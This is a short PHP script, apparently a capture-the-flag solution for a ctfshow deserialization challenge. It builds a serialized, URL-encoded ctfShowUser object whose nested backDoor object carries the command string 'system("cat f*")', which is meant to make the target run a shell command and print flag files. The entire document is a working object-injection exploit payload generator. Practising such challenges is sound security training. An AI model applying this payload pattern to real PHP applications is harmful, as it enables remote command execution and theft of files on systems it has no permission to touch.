<?php
    class ctfShowUser
    {
        public $username='xxxxxx';
        public $password='xxxxxx';
        public $isVip=true;
        public $class='backDoor';
 
        public function __construct()
        {
        $this->class=new backDoor();
        }
    }
    class backDoor
    {
        public $code='system("cat f*");';
    }
 
    $ctfShowUserObj = new ctfShowUser();
    $a = serialize($ctfShowUserObj);
    echo urlencode($a);
 
?>
